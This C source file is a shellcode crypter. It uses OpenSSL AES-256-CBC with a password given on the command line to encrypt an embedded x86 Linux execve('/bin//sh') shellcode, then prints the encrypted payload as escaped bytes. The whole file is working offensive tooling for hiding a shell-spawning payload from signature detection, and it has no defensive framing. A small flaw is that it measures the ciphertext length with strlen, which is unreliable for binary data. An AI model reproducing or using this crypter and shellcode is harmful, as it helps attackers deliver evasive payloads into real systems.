#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

// generate keys
int aes_init(unsigned char *key_data, int key_data_len, unsigned char *salt, EVP_CIPHER_CTX *e_ctx)
{
	int i, nrounds = 5;
	unsigned char key[32], iv[32];

	/*
	 * Gen key & IV for AES 256 CBC mode. A SHA1 digest is used to hash the supplied key material.
	 * nrounds is the number of times the we hash the material. More rounds are more secure but
	 * slower.
	 */

	i = EVP_BytesToKey(EVP_aes_256_cbc(), EVP_sha1(), salt, key_data, key_data_len, nrounds, key, iv);
	if (i != 32) {
		printf("Key size is %d bits - should be 256 bits\n", i);
		return -1;
	}
	EVP_CIPHER_CTX_init(e_ctx);
	EVP_EncryptInit_ex(e_ctx, EVP_aes_256_cbc(), NULL, key, iv);

	return 0;
}

unsigned char *aes_encrypt(EVP_CIPHER_CTX *e, unsigned char *plaintext, int *len)
{
	/* max ciphertext len for a n bytes of plaintext is n + AES_BLOCK_SIZE -1 bytes */
	int c_len = *len + AES_BLOCK_SIZE, f_len = 0;
	unsigned char *ciphertext = malloc(c_len);

	/* allows reusing of 'e' for multiple encryption cycles */
	EVP_EncryptInit_ex(e, NULL, NULL, NULL, NULL);

	/* update ciphertext, c_len is filled with the length of ciphertext generated,
	 *len is the size of plaintext in bytes */
	EVP_EncryptUpdate(e, ciphertext, &c_len, plaintext, *len);

	/* update ciphertext with the final remaining bytes */
	EVP_EncryptFinal_ex(e, ciphertext+c_len, &f_len);

	*len = c_len + f_len;
	return ciphertext;
}

int main(int argc, char **argv)
{
	// our context to encrypt
	EVP_CIPHER_CTX ctx_en;
	// let's use some salt
	unsigned int salt[] = {12345, 54321, 00000, 99999};
	// the password
	unsigned char *key_data = (unsigned char *)argv[1];
	int key_data_len = strlen(argv[1]);
	// init aes
	if (aes_init(key_data, key_data_len, (unsigned char *)&salt, &ctx_en)) {
    		printf("Couldn't initialize AES cipher\n");
    		return -1;
  	}
	// encrypt
	unsigned char code[] =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  		"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
	unsigned int len = strlen(code);
	unsigned char *encrypted_code;

	encrypted_code = aes_encrypt(&ctx_en, (unsigned char *)code, &len);
	int i;
	for(i = 0; i < len; i++)
		printf("\\x%02x", encrypted_code[i]);
	printf("\nLength:%zu\n", strlen(encrypted_code));

	free(encrypted_code);
	EVP_CIPHER_CTX_cleanup(&ctx_en);

	return 0;
}
